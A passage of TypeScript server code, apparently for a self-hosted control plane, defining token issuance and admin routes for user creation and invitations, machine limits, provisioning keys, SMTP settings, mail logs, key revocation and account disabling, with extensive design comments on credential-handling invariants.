      iss: issuer,
      sub: caller.userId,
      // The audience binding. Without it a token minted for one machine would
      // verify perfectly at every other machine that trusts this same key.
      aud: machineId,
      jti: newId("t"),
      iat: nowSeconds,
      nbf: nowSeconds,
      exp: nowSeconds + tokenTtlSeconds,
      scp: scopes,
    };

    return c.json({
      token: signToken(claims, signing.kid, signing.privateKey),
      expiresAt: claims.exp * 1000,
      scopes,
      machine: {
        id: machineId,
        name: String(machine["name"]),
        /*
         * The route, in the answer the client already asks for. There is one, and
         * `relayOnline: false` now means unreachable outright rather than
         * "unreachable this way" — a daemon that holds no tunnel has no other
         * door, because it binds loopback and the registry records no address.
         */
        // The one that decides whether the browser reaches this machine at all.
        relayUrl: relayUrlFor(machineId),
        relayOnline: relayOnline(machineId),
      },
      // So a client can tell "my clock is wrong" from "the token was refused".
      serverTime: Date.now(),
    });
  });

  /* ---------------------------------------------------------------- *
   * Admin
   * ---------------------------------------------------------------- */

  /**
   * Create a person, in one of two shapes decided by whether mail works.
   *
   * **With SMTP configured this returns no secret at all.** The admin gives a
   * name and an address, the person gets a link, and they choose a password
   * nobody else has ever seen. That is the literal reading of "so the admin does
   * not know it", and it is reachable only here — an invitation is a `reset`
   * token against an account with no password row, which is why it needs no third
   * token purpose and why `POST /v1/reset` already handles it: that route upserts.
   *
   * **Without SMTP it generates a password and writes an obligation.** The admin
   * sees it once, hands it over, and THE SECOND LINE refuses the account
   * everything until it is replaced. The password is generated rather than typed
   * because an admin choosing one for somebody else picks a weaker one and sends
   * it through a chat app anyway.
   *
   * The honest asymmetry, stated because it looks like an inconsistency with the
   * deleted reset route: on this arm the admin *does* see a password once, and
   * that is not the same act as a reset. **At creation there is no account to
   * steal.** A password handed over at creation grants nothing the act of
   * creating the account did not already grant; a reset takes an account that
   * already belongs to somebody. The obligation closes what remains of the
   * window — if the admin signs in first they land on the wall, so a takeover is
   * visible rather than silent.
   *
   * **`withKey` is deleted.** It was the third credential-issuing door and the
   * one `install.sh` actually drove, so leaving it would have made "an admin can
   * never issue a credential" true in the documentation and false in the code.
   * What it existed for — a credential that survives a rollback past passwords —
   * is now `POST /v1/me/keys`, which the person runs themselves.
   */
  app.post("/v1/admin/users", requireAdmin, async (c) => {
    const body = await readJsonObject(c);
    if (!body) return jsonError(c, 400, "bad_request", "expected a JSON object body");
    const name = body["name"];
    if (typeof name !== "string" || name.trim().length === 0 || name.length > 200) {
      return jsonError(c, 400, "bad_request", "name is required and must be at most 200 characters");
    }
    // A name is a login now, so the shape it may take is narrower than "any 200
    // characters". `/` in particular would make `<owner>` ambiguous anywhere a
    // machine label is qualified, and leading or trailing space in a credential
    // field is a support ticket nobody can diagnose.
    const trimmed = name.trim();
    if (!USER_NAME.test(trimmed)) return jsonError(c, 400, "bad_request", USER_NAME_HELP);
    const isAdmin = body["isAdmin"] === true;

    const canInvite = mailConfigured(db).configured;
    const rawEmail = body["email"];
    let invite: { address: string; folded: string } | null = null;
    if (rawEmail !== undefined && rawEmail !== null && rawEmail !== "") {
      if (!canInvite) {
        return jsonError(c, 409, "mail_unconfigured", "this control plane cannot send mail, so it cannot invite");
      }
      const checked = checkEmailAddress(rawEmail);
      if (!checked.ok) return jsonError(c, 400, "bad_request", checked.message);
      if (verifiedOwnerOf(db, checked.folded) !== null) {
        // An admin typed this address, so naming the clash is not an oracle —
        // they can already list every account. Saying so is what stops them
        // sending an invitation that can never be confirmed.
        return jsonError(c, 409, "email_taken", "another account has already confirmed that address");
      }
      invite = { address: checked.address, folded: checked.folded };
    }

    const existing = db.prepare("SELECT id FROM users WHERE name = ?").get(trimmed);
    if (existing) return jsonError(c, 409, "user_exists", "a user with that name already exists");

    // The invited arm has no password at all — not a generated one nobody is
    // told, which would be a hash sitting in the table doing nothing and a second
    // state for `hasPassword` to be wrong about.
    const password = invite === null ? generatePassword() : null;
    let hash: string | null = null;
    if (password !== null) {
      const problem = checkPasswordPolicy(password, trimmed);
      // Unreachable unless `generatePassword` and the policy disagree, which is
      // exactly the sort of thing that would otherwise be discovered by a person
      // being handed a password the service will not accept.
      if (problem !== null) return jsonError(c, 503, "overloaded", `could not generate a password: ${problem}`);
      try {
        hash = await hashPassword(password, "authenticated");
      } catch (error) {
        if (error instanceof PasswordBusyError) return passwordBusy(c);
        throw error;
      }
    }

    const userId = newId("u");
    const now = Date.now();
    db.exec("BEGIN");
    try {
      db.prepare("INSERT INTO users (id, name, is_admin, created_at) VALUES (?, ?, ?, ?)").run(
        userId,
        trimmed,
        isAdmin ? 1 : 0,
        now,
      );
      if (hash !== null) {
        db.prepare("INSERT INTO user_passwords (user_id, hash, updated_at) VALUES (?, ?, ?)").run(userId, hash, now);
        // The wall. Written here and nowhere else, and reachable only on this
        // arm: an invited person chooses their own password, so there is nothing
        // for them to be obliged to replace.
        db.prepare("INSERT INTO password_obligations (user_id, reason, created_at) VALUES (?, 'admin_created', ?)").run(
          userId,
          now,
        );
      }
      if (invite !== null) {
        db.prepare(
          "INSERT INTO user_emails (user_id, email, email_folded, verified_at, updated_at) VALUES (?, ?, ?, NULL, ?)",
        ).run(userId, invite.address, invite.folded, now);
      }
      db.exec("COMMIT");
    } catch (error) {
      db.exec("ROLLBACK");
      /*
       * The read above is not the guard it looks like, and the window is the
       * whole KDF.
       *
       * `SELECT id FROM users WHERE name = ?` happens ~51ms before this INSERT,
       * with `await hashPassword` in between, so two overlapping creates of one
       * name both pass it and the second trips `users.name UNIQUE`. Rethrown, it
       * reached Hono's default handler and answered `500 text/plain :: Internal
       * Server Error` — a body with no `error.code`, which is the one shape every
       * client here is written against, from the exact request that answers
       * `409 user_exists` when it is run a second later. Two admins, two tabs, or
       * a provisioning script retrying is all it takes.
       *
       * Reported as the name clash rather than as "some uniqueness failed"
       * because every other unique column touched here is a primary key holding
       * an id `newId` has just minted from fresh random bytes — a collision there
       * is not a case, and calling it one would be inventing a second meaning for
       * a 409 nobody can act on. The transaction has already rolled back, so
       * there is no half-created user behind this answer.
       */
      if (isUniqueViolation(error)) {
        return jsonError(c, 409, "user_exists", "a user with that name already exists");
      }
      throw error;
    }

    if (invite !== null) {
      /*
       * The invitation, minted after COMMIT because `mintEmailToken` opens its
       * own transaction on this same synchronous connection.
       *
       * Confirming it both sets the password and marks the address verified,
       * because clicking a link mailed to that address *is* the proof — so the
       * invited path never needs a separate verification step.
       */
      const minted = mintEmailToken(db, userId, "reset", invite.folded, INVITE_TTL_MS, now);
      const queued = send(
        invite.address,
        "invite",
        invitation({
          name: trimmed,
          invitedBy: c.get("caller").name,
          url: `${publicOrigin()}/reset#t=${minted.token}`,
          lifetime: lifetimeText(INVITE_TTL_MS),
        }),
        minted.expiresAt,
      );
      return c.json(
        { id: userId, name: trimmed, isAdmin, invited: true, email: invite.address, mailQueued: queued },
        201,
      );
    }

    // The only time this value exists anywhere. Only its hash was stored.
    return c.json({ id: userId, name: trimmed, isAdmin, invited: false, password, mustChangePassword: true }, 201);
  });

  /**
   * Send an invitation again.
   *
   * **Without this an invited account could become permanently unreachable, and
   * nothing else in the service could rescue it.** An invitation is the only
   * credential such an account ever has: there is no `user_passwords` row, and
   * the address is *unverified* — deliberately, since clicking the link is what
   * verifies it — so `POST /v1/forgot` mails nothing, because `verifiedOwnerOf`
   * is what it looks the address up by. If the invitation is never delivered (a
   * full outbox, a permanent 5xx, SMTP broken at that moment) or is simply not
   * opened inside 48 hours, every door is shut at once: the account cannot sign
   * in, cannot recover, `POST /v1/admin/users` answers `409 user_exists`, and the
   * admin reset and key-mint routes that used to be the way out were deleted in
   * this same change. The only remaining remedy was `DELETE` and recreate, which
   * also releases the person's machines.
   *
   * **It issues nothing to the caller, which is what keeps the invariant true.**
   * The response carries no token and no password; the link goes to the address
   * on the account and nowhere else. This is the same act `POST /v1/admin/users`
   * already performs at creation, repeated — an admin who could not read the
   * first mail cannot read this one either.
   *
   * Refused for an account that already has a password, and the code says which:
   * that person is not stuck in this state, and re-inviting them would mint a
   * password-setting link for an account somebody is using.
   */
  app.post("/v1/admin/users/:id/invite", requireAdmin, (c) => {
    const userId = c.req.param("id");
    const user = db.prepare("SELECT name, disabled_at FROM users WHERE id = ?").get(userId);
    if (user === undefined) return jsonError(c, 404, "user_not_found", "no such user");
    if (user["disabled_at"] !== null) {
      return jsonError(c, 409, "user_disabled", "enable the account before inviting them again");
    }
    if (db.prepare("SELECT 1 FROM user_passwords WHERE user_id = ?").get(userId) !== undefined) {
      return jsonError(c, 409, "user_has_password", "this account already has a password — they can sign in or use the forgotten-password link");
    }
    const address = emailOf(db, userId);
    if (address === null) {
      return jsonError(c, 409, "user_has_no_email", "this account has no address to invite");
    }
    if (mail === null || !mailConfigured(db).configured) {
      return jsonError(c, 409, "mail_unconfigured", "configure SMTP before sending an invitation");
    }

    const now = Date.now();
    // Supersedes any live invitation, `mintEmailToken`'s one-live-link rule, so a
    // resend cannot leave two working links for one account.
    const minted = mintEmailToken(db, userId, "reset", address.emailFolded, INVITE_TTL_MS, now);
    const queued = send(
      address.email,
      "invite",
      invitation({
        name: String(user["name"]),
        invitedBy: c.get("caller").name,
        url: `${publicOrigin()}/reset#t=${minted.token}`,
        lifetime: lifetimeText(INVITE_TTL_MS),
      }),
      minted.expiresAt,
    );
    return c.json({ email: address.email, mailQueued: queued, expiresAt: minted.expiresAt });
  });

  app.get("/v1/admin/users", requireAdmin, (c) => {
    const rows = db
      .prepare(
        "SELECT u.id, u.name, u.is_admin, u.created_at, u.disabled_at, " +
          "  (SELECT COUNT(*) FROM user_passwords p WHERE p.user_id = u.id) AS has_password, " +
          "  (SELECT COUNT(*) FROM user_sessions s WHERE s.user_id = u.id AND s.revoked_at IS NULL " +
          "     AND s.expires_at > ?) AS sessions, " +
          "  (SELECT COUNT(*) FROM api_keys k WHERE k.user_id = u.id AND k.revoked_at IS NULL) AS keys, " +
          // A join rather than two correlated subqueries against one row of one
          // table: `user_emails.user_id` is the primary key, so this is 1:1 and
          // the pair was fetching the same row twice per user.
          "  e.email AS email, e.verified_at AS email_verified_at, " +
          "  (SELECT COUNT(*) FROM password_obligations o WHERE o.user_id = u.id) AS owes_password, " +
          // How many machines they own, and their override if they have one.
          // This is the screen an admin lowers a limit from, so it has to show
          // both sides of the fallback — the same obligation
          // `GET /v1/admin/settings` meets for a setting. The count is a
          // correlated subquery like `sessions` and `keys` beside it; the
          // override is a join, because `user_machine_limits.user_id` is a
          // primary key and the join is 1:1.
          "  (SELECT COUNT(*) FROM machine_owners mo WHERE mo.user_id = u.id) AS machines, " +
          "  ml.max_machines AS machine_limit " +
          /*
           * Deliberately unpaged, unlike `/v1/admin/grants` and `/v1/admin/mail`.
           * Those two grow with the fleet and with *time*; this one grows with
           * the number of people, which is bounded by there being people. Adding
           * a page here would change the shape every client reads for no measured
           * pressure — the argument `/v1/admin/mail`'s own docblock makes in
           * reverse.
           */
          "FROM users u LEFT JOIN user_emails e ON e.user_id = u.id " +
          "  LEFT JOIN user_machine_limits ml ON ml.user_id = u.id ORDER BY u.created_at ASC",
      )
      .all(Date.now());
    // Once, before the loop — every row without an override resolves to it.
    const instanceDefault = instanceMachineLimit(db);
    return c.json({
      users: rows.map((row) => ({
        id: String(row["id"]),
        name: String(row["name"]),
        isAdmin: Number(row["is_admin"]) === 1,
        createdAt: Number(row["created_at"]),
        disabled: row["disabled_at"] !== null,
        /*
         * The address, and whether it was proved.
         *
         * Both, rather than one derived from the other, for the reason
         * `GET /v1/me` gives: an unverified address reserves nothing and cannot
         * receive a reset, so an admin reading this list needs to see the
         * difference. It is also the only place the cost of deleting the admin
         * reset is visible — an account with no verified address has **no
         * recovery** on an instance with no SMTP, and that is a thing an admin
         * should be able to look at rather than discover.
         */
        email: row["email"] === null ? null : String(row["email"]),
        emailVerified: row["email_verified_at"] !== null,
        /** Created with a temporary password and still holding it. */
        mustChangePassword: Number(row["owes_password"]) > 0,
        // Which accounts predate passwords and are still on a key alone. Without
        // it the only way to tell is to ask them to try signing in.
        hasPassword: Number(row["has_password"]) > 0,
        sessions: Number(row["sessions"]),
        /*
         * How many live API keys, which an admin could not see **at all**.
         *
         * The one credential here that never expires and that nothing prompted
         * anybody to revoke was also the one absent from the list read to answer
         * "who can use this". A count rather than the keys themselves: this route
         * is the fleet-wide list and a per-user detail belongs on the per-user
         * route, which `GET /v1/admin/users/:id/keys` now is.
         *
         * A correlated subquery like the two above it, filtered to unrevoked —
         * the question is how many credentials still work, not how many were ever
         * minted.
         */
        keys: Number(row["keys"]),
        /*
         * How many machines they own, their ceiling, and which side it came
         * from — the three numbers the machine-limit panel on this row draws.
         *
         * `machinesOverLimit` is arithmetic rather than a query, and it is
         * exactly right because the rank `quota.ts` computes is a dense 0-based
         * position: with N machines and a limit of L, the ones over are the
         * newest `N - L`. Clamped at zero so somebody within their limit reads
         * 0 rather than a negative.
         */
        machines: Number(row["machines"]),
        machineLimit:
          row["machine_limit"] === null
            ? instanceDefault
            : Math.min(Number(row["machine_limit"]), MAX_MACHINES_PER_USER),
        machineLimitSource: row["machine_limit"] === null ? "default" : "override",
        /*
         * What clearing their override would land on.
         *
         * `machineLimit` above is already resolved, so for a row carrying an
         * override it says nothing about what "use the default" costs — and that
         * button drops somebody straight onto this number. Without it the admin
         * screen either confirms with a sentence naming no number, or does not
         * confirm at all, which is what it did: clearing an override of ten on an
         * instance whose default is two stopped eight machines on one tap, with
         * the count arriving in a toast afterwards.
         *
         * Free: `instanceDefault` is read once above the loop because every row
         * without an override already resolves to it.
         */
        machineLimitDefault: instanceDefault,
        machinesOverLimit: Math.max(
          0,
          Number(row["machines"]) -
            (row["machine_limit"] === null
              ? instanceDefault
              : Math.min(Number(row["machine_limit"]), MAX_MACHINES_PER_USER)),
        ),
      })),
    });
  });

  /**
   * One person's machine limit, and what changing it costs.
   *
   * **Two verbs rather than a nullable field**, which is the rule
   * `PUT /v1/admin/settings` already makes and which binds harder here: `0` and
   * "no override" are one keystroke apart in a JSON body and mean opposite
   * things — no machines at all, versus whatever the instance default says.
   * A `{maxMachines: null}` that meant "clear" would be one typo from
   * switching somebody's fleet off.
   *
   * **Lowering below their current count is allowed, with no refusal and no
   * confirmation flag.** That is the feature: the machines they acquired most
   * recently stop working, nothing is deleted, and raising the number brings
   * them back. What the route owes in exchange is telling the admin exactly
   * which ones went, which is `suspended` — the lasting effect outside the row
   * this wrote, reported for the reason `machinesReleased` and
   * `enrollmentCodesInvalidated` are.
   *
   * Both verbs answer the same shape, so a client renders one thing.
   */
  const machineLimitAnswer = (userId: string): Record<string, unknown> => {
    const quota = effectiveLimit(db, userId);
    const suspended = overLimitMachines(db, userId, quota.limit);
    return {
      userId,
      maxMachines: quota.limit,
      source: quota.source,
      instanceDefault: quota.instanceDefault,
      owned: machineCount(db, userId),
      suspended,
    };
  };

  app.put("/v1/admin/users/:id/machine-limit", requireAdmin, async (c) => {
    const body = await readJsonObject(c);
    if (!body) return jsonError(c, 400, "bad_request", "expected a JSON object body");
    const userId = c.req.param("id");
    const wanted = body["maxMachines"];
    if (typeof wanted !== "number" || !Number.isInteger(wanted)) {
      return jsonError(c, 400, "bad_request", "maxMachines must be a whole number");
    }
    if (wanted < 0) return jsonError(c, 400, "bad_request", "maxMachines may not be negative");
    if (wanted > MAX_MACHINES_PER_USER) {
      // Naming the ceiling rather than only refusing: an admin told "no" with no
      // number retries with a smaller guess.
      return jsonError(
        c,
        400,
        "bad_request",
        `maxMachines may not exceed ${MAX_MACHINES_PER_USER}, which is the fleet-wide ceiling`,
      );
    }
    if (!db.prepare("SELECT id FROM users WHERE id = ?").get(userId)) {
      return jsonError(c, 404, "user_not_found", "no such user");
    }
    writeMachineLimit(db, userId, wanted, c.get("caller").userId);
    return c.json(machineLimitAnswer(userId));
  });

  /**
   * The fleet provisioning key: whether there is one, and minting another.
   *
   * **Two verbs, and the read answers a boolean.** There is at most one key and
   * nothing anywhere draws it — not the value, not the prefix, not an id — so
   * `GET` says only that one exists. A projection carrying more would exist
   * purely to be a second place the credential can leak from, which is the same
   * reason `GET /v1/admin/settings` sends `null` for `smtp.password`.
   *
   * `POST` mints, retiring the previous one in the same transaction, and is the
   * only response in this service that ever carries a `pk_`. There is no
   * `DELETE`: minting again is how a leak is closed, and "provisioning is off"
   * would be a third state to reason about for a fleet that either hands out
   * hosts or does not.
   */
  app.get("/v1/admin/provisioning-key", requireAdmin, (c) => {
    return c.json({ minted: hasProvisioningKey(db) });
  });

  app.post("/v1/admin/provisioning-key", requireAdmin, (c) => {
    // The one time it is ever returned. Shown once by the screen and stored as a
    // hash, exactly as a one-time password is.
    return c.json({ key: mintProvisioningKey(db, c.get("caller").userId).key }, 201);
  });

  app.delete("/v1/admin/users/:id/machine-limit", requireAdmin, (c) => {
    const userId = c.req.param("id");
    if (!db.prepare("SELECT id FROM users WHERE id = ?").get(userId)) {
      return jsonError(c, 404, "user_not_found", "no such user");
    }
    // Not an error when there was no row: the caller asked for this account to
    // follow the instance default and it now does, which is what they wanted
    // whether or not anything was deleted.
    clearMachineLimit(db, userId);
    return c.json(machineLimitAnswer(userId));
  });

  /* ---------------------------------------------------------------- *
   * Server settings
   * ---------------------------------------------------------------- */

  /**
   * Every setting, both sides of the fallback, and never a secret.
   *
   * **Every key is present even when neither side has a value**, because a
   * screen that draws only what exists cannot offer to set the rest.
   * `envValue` is returned for non-secret keys so an operator can see what
   * "reset to environment" *would* give before doing it — which is the entire
   * point of carrying provenance rather than just an effective value.
   *
   * For `smtp.password`: `value` is always `null` and two booleans say what
   * exists. **Never the bytes, never the length, never a masked prefix.** A
   * masked prefix is the usual choice and it is wrong here — the operator does
   * not need it, and it puts a substring of a live credential into a response
   * body that may traverse a proxy they do not own. `apiKeyRows` makes the same
   * decision one route along and states the same rule.
   */
  app.get("/v1/admin/settings", requireAdmin, (c) => {
    // Named apart from the `mail` sender bound above, which this used to shadow.
    const mailSettings = mailConfigured(db);
    return c.json({
      settings: SETTING_KEYS.map((key) => {
        const resolved = readSetting(db, key);
        const envName = envNameFor(key);
        const secret = SECRET_SETTING_KEYS.has(key);
        return {
          key,
          secret,
          value: secret ? null : resolved.value,
          set: secret ? resolved.source === "database" : undefined,
          source: resolved.source,
          envName,
          envValue: secret ? undefined : ((process.env[envName] ?? "").trim() || null),
          envSet: (process.env[envName] ?? "").trim().length > 0,
        };
      }),
      /*
       * `configured` says whether the settings are complete; `delivery` says
       * whether anything is actually arriving, and only the second one can tell
       * an admin their first user never got their invitation.
       *
       * Both on the same object because they are read together and answer
       * halves of one question — a fully configured instance whose provider
       * started rejecting the From address is `configured: true` with a rising
       * `failed`, which is precisely the state that had no surface anywhere.
       */
      mail: {
        configured: mailSettings.configured,
        problems: mailSettings.problems,
        delivery: { ...mailHealth(db), paused: mail?.paused?.() === true },
      },
      registration: registrationMode(db),
      serverTime: Date.now(),
    });
  });

  /**
   * Change settings.
   *
   * **Two verbs — `set` and `clear` — rather than `null` meaning delete.**
   * `null` and `""` are one keystroke apart in a JSON body and exactly one of
   * them is destructive; and an empty string is a *value* here
   * (`smtp.username = ""` means "this server wants no username"), so the two
   * cannot be the same act.
   *
   * Values are always strings, including `"587"` and `"true"`. The column is
   * TEXT, so accepting a JSON number would mean `String()`-ing it on the way in
   * and returning a string on the way out — a route whose response does not
   * round-trip its own request, which is a shape of bug this codebase keeps
   * finding. An unknown key is a 400 **naming the key**: an admin who typed
   * `smtp.hostname` and got a 200 has been told their SMTP works.
   */
  app.put("/v1/admin/settings", requireAdmin, async (c) => {
    const body = await readJsonObject(c);
    if (!body) return jsonError(c, 400, "bad_request", "expected a JSON object body");

    const set = body["set"];
    const clear = body["clear"];
    const writes: [SettingKey, string][] = [];
    const clears: SettingKey[] = [];

    if (set !== undefined) {
      if (typeof set !== "object" || set === null || Array.isArray(set)) {
        return jsonError(c, 400, "bad_request", "set must be an object of key to string");
      }
      for (const [key, value] of Object.entries(set as Record<string, unknown>)) {
        if (!isSettingKey(key)) return jsonError(c, 400, "unknown_setting", `no such setting: ${key}`);
        if (typeof value !== "string") {
          return jsonError(c, 400, "bad_request", `${key} must be a string`);
        }
        const problem = checkSettingValue(key, value);
        if (problem !== null) return jsonError(c, 400, "bad_request", problem);
        writes.push([key, value]);
      }
    }

    if (clear !== undefined) {
      if (!Array.isArray(clear)) return jsonError(c, 400, "bad_request", "clear must be an array of keys");
      for (const key of clear) {
        if (typeof key !== "string" || !isSettingKey(key)) {
          return jsonError(c, 400, "unknown_setting", `no such setting: ${String(key)}`);
        }
        clears.push(key);
      }
    }

    const caller = c.get("caller");
    const now = Date.now();
    // Validated in full before anything is written, so a body with one bad key
    // leaves the configuration exactly as it was rather than half-applied.
    db.exec("BEGIN");
    try {
      for (const [key, value] of writes) writeSetting(db, key, value, caller.userId, now);
      for (const key of clears) clearSetting(db, key);
      db.exec("COMMIT");
    } catch (error) {
      db.exec("ROLLBACK");
      throw error;
    }

    // The mail configuration may have just become usable, so anything queued
    // while it was not is worth another look immediately.
    mail?.wake();

    const configured = mailConfigured(db);
    return c.json({
      settings: SETTING_KEYS.map((key) => {
        const resolved = readSetting(db, key);
        const secret = SECRET_SETTING_KEYS.has(key);
        const envName = envNameFor(key);
        return {
          key,
          secret,
          value: secret ? null : resolved.value,
          set: secret ? resolved.source === "database" : undefined,
          source: resolved.source,
          envName,
          envValue: secret ? undefined : ((process.env[envName] ?? "").trim() || null),
          envSet: (process.env[envName] ?? "").trim().length > 0,
        };
      }),
      mail: { configured: configured.configured, problems: configured.problems },
      registration: registrationMode(db),
      serverTime: now,
    });
  });

  /**
   * Send a test message.
   *
   * **It enqueues and answers 202; it does not send inline.** The temptation is
   * real — an operator wants the SMTP transcript *now*, and every self-hosted
   * app does this synchronously — and it is refused for a specific reason: a
   * synchronous send is a request of up to ninety seconds against an
   * admin-supplied host, on the process that carries every relay tunnel in the
   * fleet. It is the one route where somebody would happily hold that socket
   * open, which makes it the worst place to allow it. `wake()` means the pump
   * picks it up immediately, so the delivery log carries the server's own reply
   * within a second — two polls of one route instead of one long request.
   */
  app.post("/v1/admin/settings/test", requireAdmin, async (c) => {
    const caller = c.get("caller");
    if (!mailConfigured(db).configured) {
      return jsonError(c, 409, "mail_unconfigured", "set a host, a from address and a public URL first");
    }

    const key = mailTestKey(caller.userId);
    const decision = throttle.check(key);
    if (!decision.allowed) return tooManyAttempts(c, decision.retryAfterSeconds);
    throttle.fail(key);

    const body = await readJsonObject(c);
    const checked = checkEmailAddress(body?.["to"] ?? emailOf(db, caller.userId)?.email);
    if (!checked.ok) return jsonError(c, 400, "bad_request", checked.message);

    const id = mail?.enqueue({
      to: checked.address,
      kind: "test",
      subject: testMessage({ instance: instanceName(), sentBy: caller.name }).subject,
      text: testMessage({ instance: instanceName(), sentBy: caller.name }).text,
      html: testMessage({ instance: instanceName(), sentBy: caller.name }).html,
      notAfter: Date.now() + 10 * 60 * 1000,
    });
    if (id === null || id === undefined) {
      return passwordBusy(c, "too much mail queued right now — try again in a moment");
    }
    mail?.wake();
    return c.json({ id, to: checked.address }, 202);
  });

  /**
   * What has been sent, and what failed.
   *
   * Paged like `/v1/admin/grants`, and with a stronger reason than that list
   * had: this one grows with *time* rather than with the fleet, so it is
   * unbounded on any instance that stays up.
   *
   * **Never `body`.** A queued message holds a live one-time link, and a
   * delivery log that carried it would be a place an admin could spend somebody
   * else's password reset. Failures are listed rather than filtered, because
   * the question this answers is "did the message I just asked for go out",
   * which a list of successes cannot answer.
   *
   * It is a **disclosure surface** and that is said out loud rather than
   * discovered: a registration delivery names an address belonging to somebody
   * who is not a user and may never become one. Legitimate behind `requireAdmin`
   * on a self-hosted instance, and worth knowing about.
   */
  app.get("/v1/admin/mail", requireAdmin, (c) => {
    const limit = boundedInt(c.req.query("limit"), 100, 500);
    const offset = boundedInt(c.req.query("offset"), 0);
    const total = Number(db.prepare("SELECT COUNT(*) AS n FROM mail_outbox").get()?.["n"] ?? 0);
    const rows = db
      .prepare(
        "SELECT id, to_address, kind, subject, created_at, attempts, next_at, sent_at, failed_at, last_error " +
          "FROM mail_outbox ORDER BY created_at DESC LIMIT ? OFFSET ?",
      )
      .all(limit, offset);
    return c.json({
      total,
      limit,
      offset,
      deliveries: rows.map((row) => ({
        id: String(row["id"]),
        to: String(row["to_address"]),
        kind: String(row["kind"]),
        subject: String(row["subject"]),
        createdAt: Number(row["created_at"]),
        attempts: Number(row["attempts"]),
        nextAt: Number(row["next_at"]),
        sentAt: row["sent_at"] === null ? null : Number(row["sent_at"]),
        failedAt: row["failed_at"] === null ? null : Number(row["failed_at"]),
        error: row["last_error"] === null ? null : String(row["last_error"]),
      })),
    });
  });

  /**
   * Try a failed message again.
   *
   * Refuses when the body has been swept, because a message whose content is
   * gone cannot be re-sent and answering 200 would claim otherwise.
   */
  app.post("/v1/admin/mail/:id/retry", requireAdmin, (c) => {
    const id = c.req.param("id");
    const row = db.prepare("SELECT body, not_after FROM mail_outbox WHERE id = ?").get(id);
    if (row === undefined) return jsonError(c, 404, "mail_not_found", "no such message");
    const now = Date.now();
    if (row["body"] === null || Number(row["not_after"]) <= now) {
      return jsonError(c, 409, "mail_expired", "this message has expired and cannot be sent again");
    }
    db.prepare("UPDATE mail_outbox SET next_at = ?, failed_at = NULL, attempts = 0, last_error = NULL WHERE id = ?").run(
      now,
      id,
    );
    mail?.wake();
    return c.json({ queued: true });
  });

  /* ---------------------------------------------------------------- *
   * ⚠ Two routes used to live here and are deleted:
   *   `POST /v1/admin/users/:id/password` and `POST /v1/admin/users/:id/keys`.
   *
   * **An admin can take a credential away and can never issue one.** That is
   * the invariant those deletions buy, and it is stated as a property of the
   * whole service rather than of a route: *no route in this service issues a
   * credential for an account other than the caller's own*. The bootstrap in
   * `main.ts` is not a route and has no caller — it is the fleet coming into
   * existence. Everything else (`POST /v1/me/keys`, `/v1/login`,
   * `/v1/register/confirm`, `/v1/reset`) issues only to an account that has just
   * proved something about itself.
   *
   * It is greppable, which is what makes it survive: `INSERT INTO api_keys`
   * appears in exactly two files, and the occurrence in this one is not on a
   * route that reads `c.req.param("id")`.
   *
   * **`withKey` on `POST /v1/admin/users` had to go with them**, or the
   * invariant would have read true in the documentation and been false in the
   * code — the worst of the three possible states, and the one `install.sh`
   * actually exercised.
   *
   * What replaces the reset is `POST /v1/forgot`, which needs a verified
   * address. Where there is no SMTP there is now **no recovery for a forgotten
   * password**; that is a known limitation rather than an oversight, it is
   * recorded in `docs/DECISIONS.md`, and `GET /v1/admin/users` reports
   * `emailVerified` per row so an admin can see who is exposed to it.
   * ---------------------------------------------------------------- */

  /** Somebody's API keys — never a hash, never a key. See `apiKeyRows`. */
  app.get("/v1/admin/users/:id/keys", requireAdmin, (c) => {
    const userId = c.req.param("id");
    if (!db.prepare("SELECT id FROM users WHERE id = ?").get(userId)) {
      return jsonError(c, 404, "user_not_found", "no such user");
    }
    return c.json({ keys: apiKeyRows(db, userId) });
  });

  /**
   * Revoke somebody's API key — **the write that did not exist**.
   *
   * `callerAuth` has always read `revoked_at` and answered `api_key_revoked`, so
   * from both ends the capability looked present; there was no `UPDATE api_keys`
   * anywhere in this service. Deleting the whole user was the only way to retire
   * a key, which on the single-admin deployment `install.sh` creates means a
   * leaked admin key had no in-band remedy at all.
   *
   * No self-refusal, unlike the two routes above: revoking a credential is the
   * safe direction, and the account this most needs to be usable on is the one
   * whose key just leaked.
   */
  app.delete("/v1/admin/users/:id/keys/:keyId", requireAdmin, (c) => {
    if (!revokeApiKey(db, c.req.param("id"), c.req.param("keyId"))) {
      // One answer for unknown, already revoked, and belonging to another user —
      // the last of which is what the `user_id` clause inside makes true.
      return jsonError(c, 404, "key_not_found", "no such API key, or already revoked");
    }
    return c.json({ revoked: true });
  });

  /**
   * Ban somebody. This is what "removing a user" is: rows are never deleted.
   *
   * **One refusal, and it is the whole of "the fleet cannot lock itself out".**
   *
   * You cannot disable your own account. That reads like half a rule — the other
   * half being "and not the last admin either" — but the second check is
   * unreachable and was written and removed rather than left in looking useful:
   * any caller that gets past `requireAdmin` is itself an enabled admin
   * (`callerAuth` refuses a disabled one), so a *different* enabled admin target
   * means there are at least two. The count could never come back as one.
   *
   * What that means for a reader changing this later: **the self-check is
   * load-bearing beyond its own wording.** Remove it, or add a route that demotes
   * an admin instead of disabling one, and the last-admin case becomes reachable
   * for the first time — at which point it needs the guard this comment is
   * standing in for.
   */
  app.post("/v1/admin/users/:id/disable", requireAdmin, (c) => {
    const caller = c.get("caller");
    const userId = c.req.param("id");
    if (userId === caller.userId) {
      return jsonError(c, 409, "cannot_disable_self", "you cannot disable your own account");
    }
    const target = db.prepare("SELECT is_admin, disabled_at FROM users WHERE id = ?").get(userId);
    if (!target) return jsonError(c, 404, "user_not_found", "no such user");
    /*
     * Already-disabled is asked **before** the last-admin guard, and the order was
     * wrong the first time. Disabling clears nothing from `is_admin`, so a
     * second call against an already-banned admin found one enabled admin left
     * and answered "this is the only admin left; promote another one first" —
     * about an account that was already disabled, where the call would have
     * changed nothing at all. A refusal that names a hazard that is not there
     * sends somebody to fix the wrong thing.
     */
    if (target["disabled_at"] !== null) {
      return jsonError(c, 404, "user_not_found", "no such user, or already disabled");
    }

    const now = Date.now();
    /*
     * **One transaction, for the reason `delete` gives one file-length away, and
     * here the argument is stronger: this route has no second attempt.**
     *
     * The three statements below used to run bare. The first is a conditional
     * `UPDATE` and therefore its own compare-and-swap, so a throw in the second
     * or the third — `SQLITE_BUSY` past the busy timeout on the connection every
     * writer here shares is the realistic one — committed the ban and left the
     * enrollment codes live. And there is no way back to them: the guard above
     * reads `disabled_at` and answers `404 no such user, or already disabled`, so
     * re-running the remedy returns before it reaches `burnUserCodes`, while
     * `enable` is documented as *not* restoring what a disable burned. The
     * account would sit banned, holding a redeemable code, with the only route
